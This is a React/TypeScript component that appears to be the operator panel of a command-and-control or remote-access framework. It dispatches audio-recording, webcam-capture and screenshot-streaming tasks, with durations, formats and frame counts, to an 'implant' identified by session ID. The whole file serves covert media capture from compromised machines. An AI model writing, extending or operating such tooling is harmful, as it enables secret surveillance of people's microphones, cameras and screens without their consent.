import { useState } from 'react';
import { taskClient } from '../../api';

interface Props {
  sessionId: string;
}

function hexToUint8Array(hex: string): Uint8Array<ArrayBuffer> {
  const buffer = new ArrayBuffer(hex.length / 2);
  const bytes = new Uint8Array(buffer);
  for (let i = 0; i < hex.length; i += 2) {
    bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
  }
  return bytes;
}

interface SectionState {
  loading: boolean;
  error: string | null;
  taskId: string | null;
}

function useSectionDispatch(sessionId: string) {
  const dispatch = async (
    taskType: string,
    subcommand: string,
    setState: React.Dispatch<React.SetStateAction<SectionState>>
  ) => {
    setState({ loading: true, error: null, taskId: null });
    try {
      const encoder = new TextEncoder();
      const taskData = encoder.encode(subcommand) as Uint8Array<ArrayBuffer>;

      const response = await taskClient.dispatchTask({
        implantId: { value: hexToUint8Array(sessionId) },
        taskType,
        taskData,
      });

      const id = response.taskId
        ? Array.from(response.taskId.value).map(b => b.toString(16).padStart(2, '0')).join('')
        : '';
      setState({ loading: false, error: null, taskId: id });
      return id;
    } catch (err: any) {
      setState({ loading: false, error: err.message || 'Failed to dispatch task', taskId: null });
      return null;
    }
  };
  return dispatch;
}

const initSection = (): SectionState => ({ loading: false, error: null, taskId: null });

export function MediaCapturePanel({ sessionId }: Props) {
  // Audio state
  const [audioDuration, setAudioDuration] = useState('10');
  const [audioFormat, setAudioFormat] = useState<'wav' | 'mp3'>('wav');
  const [audioState, setAudioState] = useState<SectionState>(initSection());

  // Webcam state
  const [webcamDevice, setWebcamDevice] = useState('0');
  const [webcamFormat, setWebcamFormat] = useState<'png' | 'jpg'>('png');
  const [webcamState, setWebcamState] = useState<SectionState>(initSection());

  // Screenshot stream state
  const [ssInterval, setSsInterval] = useState('1000');
  const [ssQuality, setSsQuality] = useState('80');
  const [ssMaxFrames, setSsMaxFrames] = useState('60');
  const [ssRunning, setSsRunning] = useState(false);
  const [ssState, setSsState] = useState<SectionState>(initSection());

  const dispatch = useSectionDispatch(sessionId);

  const handleAudioCapture = () => {
    dispatch('audio', `capture\0${audioDuration}\0${audioFormat}`, setAudioState);
  };

  const handleWebcamCapture = () => {
    dispatch('webcam', `capture\0${webcamDevice}\0${webcamFormat}`, setWebcamState);
  };

  const handleSsToggle = async () => {
    if (ssRunning) {
      const id = await dispatch('screenshot_stream', 'stop', setSsState);
      if (id) setSsRunning(false);
    } else {
      const id = await dispatch(
        'screenshot_stream',
        `start\0${ssInterval}\0${ssQuality}\0${ssMaxFrames}`,
        setSsState
      );
      if (id) setSsRunning(true);
    }
  };

  return (
    <div className="p-4 space-y-6">
      <h3 className="text-ctp-text font-semibold text-sm uppercase tracking-wide">Media Capture</h3>

      {/* Audio Capture */}
      <section className="space-y-3">
        <div className="flex items-center gap-2">
          <svg className="w-4 h-4 text-ctp-blue" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2}
              d="M19 11a7 7 0 01-7 7m0 0a7 7 0 01-7-7m7 7v4m0 0H8m4 0h4m-4-8a3 3 0 01-3-3V5a3 3 0 116 0v6a3 3 0 01-3 3z" />
          </svg>
          <p className="text-sm text-ctp-text font-medium">Audio Capture</p>
        </div>

        <div className="flex gap-2 flex-wrap">
          <div className="space-y-1">
            <label className="text-xs text-ctp-subtext0">Duration (seconds)</label>
            <input
              type="number"
              min="1"
              max="3600"
              value={audioDuration}
              onChange={e => setAudioDuration(e.target.value)}
              className="w-28 px-3 py-1.5 rounded bg-ctp-surface0 border border-ctp-surface2 text-ctp-text text-sm focus:outline-none focus:border-ctp-blue"
            />
          </div>
          <div className="space-y-1">
            <label className="text-xs text-ctp-subtext0">Format</label>
            <select
              value={audioFormat}
              onChange={e => setAudioFormat(e.target.value as 'wav' | 'mp3')}
              className="px-3 py-1.5 rounded bg-ctp-surface0 border border-ctp-surface2 text-ctp-text text-sm focus:outline-none focus:border-ctp-blue"
            >
              <option value="wav">WAV</option>
              <option value="mp3">MP3</option>
            </select>
          </div>
        </div>

        <button
          onClick={handleAudioCapture}
          disabled={audioState.loading}
          className="px-3 py-1.5 rounded text-sm font-medium bg-ctp-blue text-ctp-base hover:bg-ctp-blue/80 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
        >
          {audioState.loading ? 'Dispatching...' : 'Capture'}
        </button>

        {audioState.error && (
          <div className="px-3 py-2 rounded bg-ctp-red/20 text-ctp-red text-sm border border-ctp-red/30">
            {audioState.error}
          </div>
        )}
        {audioState.taskId && (
          <div className="text-xs text-ctp-subtext0">
            Task ID: <span className="font-mono text-ctp-blue">{audioState.taskId}</span>
          </div>
        )}
      </section>

      <div className="border-t border-ctp-surface1" />

      {/* Webcam Capture */}
      <section className="space-y-3">
        <div className="flex items-center gap-2">
          <svg className="w-4 h-4 text-ctp-mauve" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2}
              d="M15 10l4.553-2.069A1 1 0 0121 8.82v6.36a1 1 0 01-1.447.894L15 14M3 8a2 2 0 012-2h8a2 2 0 012 2v8a2 2 0 01-2 2H5a2 2 0 01-2-2V8z" />
          </svg>
          <p className="text-sm text-ctp-text font-medium">Webcam Capture</p>
        </div>

        <div className="flex gap-2 flex-wrap">
          <div className="space-y-1">
            <label className="text-xs text-ctp-subtext0">Device Index</label>
            <input
              type="number"
              min="0"
              value={webcamDevice}
              onChange={e => setWebcamDevice(e.target.value)}
              className="w-24 px-3 py-1.5 rounded bg-ctp-surface0 border border-ctp-surface2 text-ctp-text text-sm focus:outline-none focus:border-ctp-mauve"
            />
          </div>
          <div className="space-y-1">
            <label className="text-xs text-ctp-subtext0">Format</label>
            <select
              value={webcamFormat}
              onChange={e => setWebcamFormat(e.target.value as 'png' | 'jpg')}
              className="px-3 py-1.5 rounded bg-ctp-surface0 border border-ctp-surface2 text-ctp-text text-sm focus:outline-none focus:border-ctp-mauve"
            >
              <option value="png">PNG</option>
              <option value="jpg">JPG</option>
            </select>
          </div>
        </div>

        <button
          onClick={handleWebcamCapture}
          disabled={webcamState.loading}
          className="px-3 py-1.5 rounded text-sm font-medium bg-ctp-mauve text-ctp-base hover:bg-ctp-mauve/80 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
        >
          {webcamState.loading ? 'Dispatching...' : 'Capture'}
        </button>

        {webcamState.error && (
          <div className="px-3 py-2 rounded bg-ctp-red/20 text-ctp-red text-sm border border-ctp-red/30">
            {webcamState.error}
          </div>
        )}
        {webcamState.taskId && (
          <div className="text-xs text-ctp-subtext0">
            Task ID: <span className="font-mono text-ctp-blue">{webcamState.taskId}</span>
          </div>
        )}
      </section>

      <div className="border-t border-ctp-surface1" />

      {/* Screenshot Stream */}
      <section className="space-y-3">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2">
            <svg className="w-4 h-4 text-ctp-green" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2}
                d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
            </svg>
            <p className="text-sm text-ctp-text font-medium">Screenshot Stream</p>
          </div>
          <span
            className={`inline-flex items-center gap-1.5 text-xs px-2 py-1 rounded-full font-medium ${
              ssRunning
                ? 'bg-ctp-green/20 text-ctp-green'
                : 'bg-ctp-surface1 text-ctp-subtext0'
            }`}
          >
            <span className={`w-1.5 h-1.5 rounded-full ${ssRunning ? 'bg-ctp-green animate-pulse' : 'bg-ctp-subtext0'}`} />
            {ssRunning ? 'Streaming' : 'Idle'}
          </span>
        </div>

        <div className="grid grid-cols-3 gap-2">
          <div className="space-y-1">
            <label className="text-xs text-ctp-subtext0">Interval (ms)</label>
            <input
              type="number"
              min="100"
              value={ssInterval}
              onChange={e => setSsInterval(e.target.value)}
              disabled={ssRunning}
              className="w-full px-3 py-1.5 rounded bg-ctp-surface0 border border-ctp-surface2 text-ctp-text text-sm focus:outline-none focus:border-ctp-green disabled:opacity-50"
            />
          </div>
          <div className="space-y-1">
            <label className="text-xs text-ctp-subtext0">Quality (1-100)</label>
            <input
              type="number"
              min="1"
              max="100"
              value={ssQuality}
              onChange={e => setSsQuality(e.target.value)}
              disabled={ssRunning}
              className="w-full px-3 py-1.5 rounded bg-ctp-surface0 border border-ctp-surface2 text-ctp-text text-sm focus:outline-none focus:border-ctp-green disabled:opacity-50"
            />
          </div>
          <div className="space-y-1">
            <label className="text-xs text-ctp-subtext0">Max Frames</label>
            <input
              type="number"
              min="1"
              value={ssMaxFrames}
              onChange={e => setSsMaxFrames(e.target.value)}
              disabled={ssRunning}
              className="w-full px-3 py-1.5 rounded bg-ctp-surface0 border border-ctp-surface2 text-ctp-text text-sm focus:outline-none focus:border-ctp-green disabled:opacity-50"
            />
          </div>
        </div>

        <button
          onClick={handleSsToggle}
          disabled={ssState.loading}
          className={`px-3 py-1.5 rounded text-sm font-medium transition-colors disabled:opacity-50 disabled:cursor-not-allowed ${
            ssRunning
              ? 'bg-ctp-red text-ctp-base hover:bg-ctp-red/80'
              : 'bg-ctp-green text-ctp-base hover:bg-ctp-green/80'
          }`}
        >
          {ssState.loading ? 'Dispatching...' : ssRunning ? 'Stop Stream' : 'Start Stream'}
        </button>

        {ssState.error && (
          <div className="px-3 py-2 rounded bg-ctp-red/20 text-ctp-red text-sm border border-ctp-red/30">
            {ssState.error}
          </div>
        )}
        {ssState.taskId && (
          <div className="text-xs text-ctp-subtext0">
            Task ID: <span className="font-mono text-ctp-blue">{ssState.taskId}</span>
          </div>
        )}
      </section>
    </div>
  );
}
